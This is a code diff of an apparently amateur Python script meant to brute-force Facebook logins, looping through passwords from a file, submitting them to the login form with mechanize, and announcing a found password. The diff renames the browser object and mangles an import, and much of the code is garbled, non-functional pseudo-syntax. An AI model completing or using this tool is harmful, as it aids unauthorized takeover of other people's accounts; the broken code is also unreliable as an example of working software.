@@ -20,7 +20,7 @@ from argparse import FileType
 from ast import Break, Continue, If, Try, excepthandler
 from math import pi
 from tokenize import String
-import webbrowser
+import webbrowserssssssssssssssssssssssssssssssssssssssssssssssssssss
 import urllib
 from nturl2path import url2pathname
 import time
@@ -41,9 +41,9 @@ webbrowser.open('www.facebook.com/cyberhacks6')
 file=open('password.txt','r')
 
 import mechanize 
-browser = mechanize.browser()
-browser.addheaders=[('User-Agent',headers['User-Agent'])]
-browser.set_handle_robots(False)
+webbrowser = mechanize.browser()
+webbrowser.addheaders=[('User-Agent',headers['User-Agent'])]
+webbrowser.set_handle_robots(False)
 excepthandler
 ConnectionError
 print("FAILED TO CONNECT TO THE INTERNET")
@@ -60,14 +60,14 @@ while FileType :
     if len(password) < 10:
       continue
     print=str(i) +" : ",password
-    response = browser.open(urlopen)
+    response = webbrowser.open(urlopen)
 
 Try
 If; response; code == 200
-browser.select_form(nr=0)()
-browser.form['email']=email
-browser.form['pass']=password
-response = browser.submit()
+webbrowser.select_form(nr=0)()
+webbrowser.form['email']=email
+webbrowser.form['pass']=password
+response = webbrowser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
 print("your password is : ",password)
